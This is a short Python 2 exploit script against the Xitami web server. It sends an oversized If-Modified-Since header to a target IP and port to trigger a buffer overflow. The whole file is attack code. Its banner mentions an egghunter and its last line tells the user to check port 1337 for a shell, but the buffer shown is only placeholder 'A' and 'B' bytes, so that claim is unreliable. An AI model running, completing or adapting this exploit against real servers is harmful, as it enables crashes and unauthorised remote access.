#!/usr/bin/python
import socket
import time
import sys 

banner = """
#----------------------------------------------#
Xitami Exploit - Egghunter
#----------------------------------------------#
"""

if len(sys.argv) != 3:
    print "Usage: ./xitami.py <Target IP> <Target Port>"
    sys.exit(1)

target = sys.argv[1]
port = int(sys.argv[2])
 
buf = "A" * 72 + "B" * 4

header = (
'GET / HTTP/1.1\r\n'
'Host: %s\r\n'
'If-Modified-Since: pwned, %s\r\n'
'\r\n') % (target, buf)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.connect((target, port))
    print "[+] Connected"
except:
    print "[!] Connection Failed"
    sys.exit(0)

print "[+] Sending payload..."
s.send(header)
time.sleep(1)
s.close()

print "[+] Check port 1337 for your shell"
